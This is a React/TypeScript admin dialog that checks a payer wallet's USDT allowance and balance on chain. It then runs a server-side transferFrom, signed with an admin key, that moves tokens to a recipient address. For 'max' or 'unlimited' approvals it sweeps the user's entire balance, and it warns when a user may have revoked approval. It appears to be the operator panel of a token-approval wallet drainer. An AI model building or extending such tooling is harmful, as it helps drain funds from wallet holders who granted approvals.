import { useState, useEffect } from 'react';
import { collectTokens, fetchAllowance, type TransactionRow, type CollectResponse, type AllowanceResponse } from './AdminApi';

interface CollectDialogProps {
  transaction: TransactionRow;
  onClose: () => void;
}

type DialogPhase = 'loading' | 'details' | 'executing' | 'success' | 'error';

function truncAddr(addr: string | null | undefined): string {
  if (!addr) return '—';
  if (addr.length <= 18) return addr;
  return `${addr.slice(0, 10)}…${addr.slice(-8)}`;
}

function getExplorerUrl(network: string, txHash: string): string {
  const isMainnet = import.meta.env.VITE_USE_MAINNET === 'true';
  const explorers: Record<string, string> = {
    ethereum: 'https://etherscan.io/tx/',
    bsc: 'https://bscscan.com/tx/',
    polygon: 'https://polygonscan.com/tx/',
    tron: isMainnet ? 'https://tronscan.org/#/transaction/' : 'https://nile.tronscan.org/#/transaction/',
    solana: 'https://explorer.solana.com/tx/',
    bitcoin: 'https://mempool.space/tx/',
  };
  return (explorers[network] ?? 'https://etherscan.io/tx/') + txHash;
}

function getAddrExplorerUrl(network: string, addr: string): string {
  const isMainnet = import.meta.env.VITE_USE_MAINNET === 'true';
  const explorers: Record<string, string> = {
    ethereum: 'https://etherscan.io/address/',
    bsc: 'https://bscscan.com/address/',
    polygon: 'https://polygonscan.com/address/',
    tron: isMainnet ? 'https://tronscan.org/#/address/' : 'https://nile.tronscan.org/#/address/',
  };
  return (explorers[network] ?? '#') + addr;
}

export function CollectDialog({ transaction, onClose }: CollectDialogProps) {
  const walletA = transaction.wallet_a || transaction.walletA || '';
  const walletB = transaction.wallet_b || transaction.walletB || '';
  const net = transaction.network || '';
  const amount = transaction.amount || '';
  const txHash = transaction.transaction_id || transaction.transactionId || '';

  const [phase, setPhase] = useState<DialogPhase>('loading');
  const [onChainData, setOnChainData] = useState<AllowanceResponse | null>(null);
  const [fetchError, setFetchError] = useState<string>('');
  const [collectResult, setCollectResult] = useState<CollectResponse | null>(null);

  // ── Phase 1: Fetch live on-chain data ──────────────────────────────────────
  useEffect(() => {
    if (!walletA) {
      setFetchError('No payer wallet address recorded for this transaction.');
      setPhase('details');
      return;
    }

    setPhase('loading');
    fetchAllowance(walletA, transaction.contract_address || undefined)
      .then((data) => {
        setOnChainData(data);
        setPhase('details');
      })
      .catch((err) => {
        setFetchError(err instanceof Error ? err.message : 'Failed to fetch on-chain data');
        setPhase('details');
      });
  }, [walletA, transaction.contract_address]);

  // ── Derived validation ─────────────────────────────────────────────────────
  const isMaxAmount = amount.trim().toLowerCase() === 'max' || amount.trim().toLowerCase() === 'unlimited';
  const amountNum = parseFloat(amount) || 0;
  const isUnlimitedAllowance = Boolean(onChainData?.isUnlimited) || (onChainData?.allowance !== null && onChainData?.allowance !== undefined && (onChainData.allowance >= 1_000_000_000 || !isFinite(onChainData.allowance)));
  const allowance = onChainData?.allowance ?? 0;
  const balance = onChainData?.balance ?? 0;
  const isAlreadyCollected = transaction.collected === true;
  // For 'max' approvals: check that on-chain allowance & balance are both > 0
  const hasAllowance = isMaxAmount ? (isUnlimitedAllowance || allowance > 0) : (isUnlimitedAllowance || allowance >= amountNum);
  const hasBalance = isMaxAmount ? balance > 0 : balance >= amountNum;
  const canCollect = !isAlreadyCollected && hasAllowance && hasBalance && (isMaxAmount || amountNum > 0) && walletA && !fetchError;

  // ── Phase 2: Execute transferFrom ──────────────────────────────────────────
  const handleContinue = async () => {
    setPhase('executing');
    setCollectResult(null);
    try {
      const res = await collectTokens(transaction.id, amount);
      setCollectResult(res);
      setPhase(res.success ? 'success' : 'error');
    } catch (err) {
      setCollectResult({
        success: false,
        amount,
        network: net,
        error: err instanceof Error ? err.message : 'Unknown error during collection',
      });
      setPhase('error');
    }
  };

  const handleRetry = () => {
    setCollectResult(null);
    setPhase('details');
  };

  // ── Step indicator labels ──────────────────────────────────────────────────
  const steps = ['Fetch Details', 'Review', 'Transfer'];
  const activeStep = phase === 'loading' ? 0 : phase === 'details' ? 1 : 2;

  return (
    <div className="admin-dialog-overlay" onClick={(e) => { if (e.target === e.currentTarget) onClose(); }}>
      <div className="admin-dialog">
        <div className="admin-dialog-handle" />
        {/* ── Header ────────────────────────────────────────────────────── */}
        <div className="admin-dialog-header">
          <h3>💰 Collect Tokens</h3>
          <button className="admin-dialog-close" onClick={onClose}>✕</button>
        </div>

        {/* ── Step Indicator ────────────────────────────────────────────── */}
        <div className="collect-steps">
          {steps.map((label, i) => (
            <div key={label} className={`collect-step ${i <= activeStep ? 'active' : ''} ${i < activeStep ? 'done' : ''}`}>
              <div className="collect-step-dot">
                {i < activeStep ? '✓' : i + 1}
              </div>
              <span className="collect-step-label">{label}</span>
              {i < steps.length - 1 && <div className="collect-step-line" />}
            </div>
          ))}
        </div>

        <div className="admin-dialog-body">
          {/* ── Loading Phase ───────────────────────────────────────────── */}
          {phase === 'loading' && (
            <div className="collect-loading">
              <div className="collect-spinner" />
              <p>Fetching live on-chain data from TronGrid...</p>
              <p style={{ fontSize: 11, color: '#94a3b8' }}>
                Checking allowance and USDT balance for {truncAddr(walletA)}
              </p>
            </div>
          )}

          {/* ── Details Phase (Step 2: Review) ─────────────────────────── */}
          {phase === 'details' && (
            <>
              {/* Transaction info */}
              <dl className="admin-dialog-info">
                <dt>Payment ID</dt>
                <dd style={{ fontFamily: 'monospace', fontSize: 11 }}>{transaction.id}</dd>

                <dt>Network</dt>
                <dd>
                  <span className={`admin-badge ${net}`}>
                    {net.toUpperCase()}
                  </span>
                </dd>

                <dt>Asset</dt>
                <dd>{transaction.asset}</dd>

                <dt>Payer (From)</dt>
                <dd>
                  <a
                    href={getAddrExplorerUrl(net, walletA)}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="admin-tx-link"
                    title={walletA}
                  >
                    {truncAddr(walletA)}
                  </a>
                </dd>

                <dt>Recipient (To)</dt>
                <dd>
                  <a
                    href={getAddrExplorerUrl(net, walletB)}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="admin-tx-link"
                    title={walletB}
                  >
                    {truncAddr(walletB)}
                  </a>
                </dd>

                <dt>Record Status</dt>
                <dd>{transaction.status}</dd>

                {txHash && (
                  <>
                    <dt>Approval Tx</dt>
                    <dd>
                      <a
                        className="admin-tx-link"
                        href={getExplorerUrl(net, txHash)}
                        target="_blank"
                        rel="noopener noreferrer"
                      >
                        {truncAddr(txHash)}
                      </a>
                    </dd>
                  </>
                )}
              </dl>

              {/* ── Live On-Chain Data Panel ──────────────────────────────── */}
              <div className="collect-onchain-panel">
                <div className="collect-onchain-title">
                  🔗 Live On-Chain Status
                </div>

                {fetchError ? (
                  <div className="collect-onchain-error">
                    ⚠️ {fetchError}
                  </div>
                ) : onChainData ? (
                  <div className="collect-onchain-grid">
                    <div className="collect-onchain-row">
                      <span>Approved Allowance</span>
                      <strong className={hasAllowance ? 'collect-val-ok' : 'collect-val-bad'}>
                        {isUnlimitedAllowance
                          ? '∞ UNLIMITED'
                          : onChainData.allowance === null || onChainData.allowance === undefined
                            ? '0 USDT'
                            : `${onChainData.allowance} USDT`}
                        {hasAllowance ? ' ✓' : ' ✗'}
                      </strong>
                    </div>
                    <div className="collect-onchain-row">
                      <span>User USDT Balance</span>
                      <strong className={hasBalance ? 'collect-val-ok' : 'collect-val-bad'}>
                        {onChainData.balance} USDT
                        {hasBalance ? ' ✓' : ' ✗'}
                      </strong>
                    </div>
                    <div className="collect-onchain-row">
                      <span>Spender</span>
                      <span style={{ fontFamily: 'monospace', fontSize: 11, color: '#64748b' }}>
                        {truncAddr(onChainData.spender)}
                      </span>
                    </div>
                  </div>
                ) : (
                  <div style={{ color: '#94a3b8', fontSize: 12 }}>No on-chain data available</div>
                )}
              </div>

              {/* ── Validation Warnings ───────────────────────────────────── */}
              {isAlreadyCollected && (
                <div className="collect-warning collect-warning-error">
                  🚫 Tokens have already been collected for this transaction.
                  {transaction.collected_tx_hash && (
                    <div style={{ marginTop: 4 }}>
                      Collect Tx:{' '}
                      <a
                        className="admin-tx-link"
                        href={getExplorerUrl(net, transaction.collected_tx_hash)}
                        target="_blank"
                        rel="noopener noreferrer"
                      >
                        {truncAddr(transaction.collected_tx_hash)}
                      </a>
                    </div>
                  )}
                </div>
              )}

              {!isAlreadyCollected && onChainData && !hasAllowance && (
                <div className="collect-warning collect-warning-error">
                  ⚠️ On-chain allowance ({allowance} USDT) is less than the amount to collect ({amount} USDT).
                  The user may have revoked the approval.
                </div>
              )}

              {!isAlreadyCollected && onChainData && hasAllowance && !hasBalance && (
                <div className="collect-warning collect-warning-warn">
                  ⚠️ User's USDT balance ({balance} USDT) is insufficient to cover {amount} USDT.
                </div>
              )}

              {/* ── Amount to Collect ─────────────────────────────────────── */}
              {!isAlreadyCollected && (
                <div className="collect-amount-box">
                  <div className="collect-amount-label">Amount to Collect</div>
                  <div className="collect-amount-value">{amount} {transaction.asset}</div>
                  <div className="collect-amount-hint">
                    Calls <code>transferFrom({truncAddr(walletA)}, {truncAddr(walletB)}, {amount})</code>
                  </div>
                </div>
              )}
            </>
          )}

          {/* ── Executing Phase ─────────────────────────────────────────── */}
          {phase === 'executing' && (
            <div className="collect-loading">
              <div className="collect-spinner" />
              <p style={{ fontWeight: 700 }}>Executing transferFrom()…</p>
              <p style={{ fontSize: 12, color: '#64748b' }}>
                Signing with admin key and broadcasting to {net.toUpperCase()} network.
                This may take 10-30 seconds.
              </p>
            </div>
          )}

          {/* ── Success Phase ──────────────────────────────────────────── */}
          {phase === 'success' && collectResult && (
            <div className="collect-result-panel collect-result-success">
              <div className="collect-result-icon">✅</div>
              <h4>Tokens Collected Successfully!</h4>
              <div className="collect-result-details">
                <div className="collect-onchain-row">
                  <span>Amount</span>
                  <strong>{collectResult.amount} {transaction.asset}</strong>
                </div>
                <div className="collect-onchain-row">
                  <span>Network</span>
                  <strong>{collectResult.network.toUpperCase()}</strong>
                </div>
                {collectResult.txHash && (
                  <div className="collect-onchain-row">
                    <span>Collect Tx</span>
                    <a
                      className="admin-tx-link"
                      href={getExplorerUrl(net, collectResult.txHash)}
                      target="_blank"
                      rel="noopener noreferrer"
                      style={{ fontWeight: 700 }}
                    >
                      {truncAddr(collectResult.txHash)} ↗
                    </a>
                  </div>
                )}
              </div>
              <p style={{ fontSize: 11, color: '#16a34a', marginTop: 8 }}>
                The tokens have been transferred from the user's wallet to the recipient address.
              </p>
            </div>
          )}

          {/* ── Error Phase ────────────────────────────────────────────── */}
          {phase === 'error' && collectResult && (
            <div className="collect-result-panel collect-result-error">
              <div className="collect-result-icon">❌</div>
              <h4>Collection Failed</h4>
              <div className="collect-error-msg">
                {collectResult.error}
              </div>
            </div>
          )}
        </div>

        {/* ── Actions ──────────────────────────────────────────────────── */}
        <div className="admin-dialog-actions">
          <button className="admin-dialog-btn-cancel" onClick={onClose}>
            {phase === 'success' ? 'Close' : 'Cancel'}
          </button>

          {phase === 'details' && !isAlreadyCollected && (
            <button
              className="admin-dialog-btn-collect"
              onClick={handleContinue}
              disabled={!canCollect}
            >
              ▶ Continue — Collect {isMaxAmount ? (balance > 0 ? `${balance.toFixed(6)} ${transaction.asset}` : 'All') : `${amount} ${transaction.asset}`}
            </button>
          )}

          {phase === 'error' && (
            <button
              className="admin-dialog-btn-collect"
              onClick={handleRetry}
              style={{ background: '#6b21ff' }}
            >
              ← Back to Details
            </button>
          )}
        </div>
      </div>
    </div>
  );
}
